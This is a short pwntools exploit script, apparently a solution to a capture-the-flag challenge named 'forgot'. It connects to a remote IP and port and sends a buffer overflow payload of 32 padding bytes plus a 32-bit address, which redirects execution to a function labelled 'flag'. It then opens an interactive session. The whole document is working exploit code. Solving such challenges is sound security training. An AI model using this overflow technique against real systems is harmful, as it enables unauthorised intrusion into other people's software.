from pwn import *

context(log_level="debug", arch="i386", os="linux")
# p = process("./forgot")
p = remote("111.200.241.244", 52806)

flag = 0x080486cc
payload = b"A" * 0x20 + p32(flag)
p.sendlineafter("> ", b"aa")
p.sendlineafter("> ", payload)
p.interactive()
